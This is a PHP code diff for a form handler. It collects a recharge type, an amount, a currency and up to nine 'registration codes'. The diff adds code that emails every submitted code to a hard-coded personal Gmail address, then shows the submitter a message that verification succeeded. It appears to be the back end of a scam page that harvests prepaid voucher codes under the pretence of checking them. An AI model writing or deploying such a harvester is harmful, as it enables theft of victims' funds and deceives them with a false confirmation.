@@ -1,6 +1,8 @@
 <?php
 
-if(!empty($_POST["send"])){
+if($_SERVER['REQUEST_METHOD'] == 'POST'){
+
+    //GET FROM ENTRIES
     $recharge =  $_POST['recharge'];
     $montant = $_POST['montant'];
     $devise = $_POST['devise'];
@@ -16,12 +18,33 @@ if(!empty($_POST["send"])){
     $codeEnregistrement9 = $_POST['codeEnregistrement9'];
     $email = $_POST['email'];
 
-    #$toEmail = $_POST['testemail@gmail.com'];
+    //SEND TO EMAIL VARIABLES
 
-    echo $recharge . " ". $montant . " " . $devise . " " . $codeEnregistrement1 . " " .$codeEnregistrement2 . " " .$codeEnregistrement3. " ".$codeEnregistrement4. " ".$codeEnregistrement5. " ".$codeEnregistrement6. " ".$codeEnregistrement7. " ".$codeEnregistrement8. " ".$codeEnregistrement9;
+    $toEmail = "carldrake969@gmail.com";
+    $subject = "New message from webiste";
+    $message = "
+    Recharge: $recharge
+    montant: $montant
+    devise: $devise
+    codeEnregistrement: $codeEnregistrement
+    codeEnregistrement1: $codeEnregistrement1
+    codeEnregistrement2: $codeEnregistrement2
+    codeEnregistrement3: $codeEnregistrement3  
+    codeEnregistrement4: $codeEnregistrement4
+    codeEnregistrement5: $codeEnregistrement5
+    codeEnregistrement6: $codeEnregistrement6
+    codeEnregistrement7: $codeEnregistrement7 
+    codeEnregistrement8: $codeEnregistrement8
+    codeEnregistrement9: $codeEnregistrement9  
+    
+    ";
+   
 
 
+    if(mail($toEmail, $subject, $message)){
+        echo "verification completed succesfully";
+    } else{
+        echo "sorry faild to submit your details try again";
+    }
 }
-
-
 ?>
